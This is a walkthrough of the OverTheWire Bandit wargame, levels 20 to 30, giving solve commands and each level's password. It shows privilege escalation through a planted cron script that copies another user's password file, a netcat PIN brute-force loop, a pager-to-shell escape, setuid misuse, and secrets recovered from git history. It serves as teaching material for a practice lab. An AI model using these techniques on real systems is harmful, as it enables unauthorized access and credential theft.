
## Level 20 -> 21
### Look -> ssh, nc, cat, bash, screen, tmux, Unix ‘job control’ (bg, fg, jobs, &, CTRL-Z, …)
#### Solve
```bash
echo -n 'GbKksEFF4yrVs6il55v6gwY5aVje5f0j' | nc -l -p 1234 &
./suconnect 1234
```
**password**: EeoULMCra2q0dSkYj561DX7s1CpBuOBt

## Level 21 -> 22
### Look -> cron, crontab, crontab(5) (use “man 5 crontab” to access this)
#### Solve
```bash
cd /etc/cron.d/
cat cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
**password**: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q

## Level 22 -> 23
### Look -> cron, crontab, crontab(5) (use “man 5 crontab” to access this)
#### Solve
```bash
cd /etc/cron.d/
cat cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
cat /tmp/ #(write echo's result)
```
**password**: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

## Level 23 -> 24
### Look -> cron, crontab, crontab(5) (use “man 5 crontab” to access this)
#### Solve
```bash
mkdir /tmp/bnd
cd /tmp/bnd
vim bandit_pass.sh
	#!/bin/bash
	cat /etc/bandit_pass/bandit24 > /tmp/bnd/password
chmod 777 bandit_pass.sh
touch password
chmod 777 password
chmod 777 .
cp bandit_pass.sh /var/spooll/bandit24/foo
cat password
# you need to wait for a minute and read the password file
```
**password**: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Level 24 -> 25
### Look -> Bash Script
#### Solve
```bash
mkdir /tmp/brutforce
cd /tmp/brutforce
vim bandit_pass.sh
	#!/bin/bash
	touch password
	for i in {1000..9999};
	do
	        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"              
	done | nc localhost 30002 > password
	cat password | grep -v "wrong"
chmod +rwx bandit_pass.sh
./bandit_pass.sh
```
**password**: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

## Level 25 -> 26
### Look -> ssh, cat, more, vi, ls, id, pwd
#### Solve
- Read
	- https://www.geeksforgeeks.org/more-command-in-linux-with-examples/
```bash
ssh -i bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org
#(you have to resize your window until see more command)
#understand how more command works
	:set shell=/bin/bash
	:sh
```
**password**: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ

## Level 26 -> 27
### Look ->  ls
#### Solve
- look bandit27-do permissions and understand what should you do!
	- IT'S SO EASY DON'T BE LAZY
```bash
ls -la
./bandit27-do cat /etc/bandit_pass/bandit27
```
**password**: upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB


## Level 27 -> 28
### Look ->  git
#### Solve
```bash
mkdir /tmp/bandit_27git
cd /tmp/bandit_27git
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
cd repo
cat README
```
**password**: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN


## Level 28 -> 29
### Look ->  git
#### Solve
- look git show and log commands
```bash
mkdir /tmp/bandit_28git
cd /tmp/bandit_28git
git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
cd repo
git log
git show 674690a00a0056ab96048f7317b9ec20c057c06b
```
**password**: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7

## Level 29 -> 30
### Look ->  git, git show
#### Solve
- look git show and log commands
```bash
mkdir /tmp/bandit_29git
cd /tmp/bandit_29git
git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
cd repo
git show origin/dev
```
**password**: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL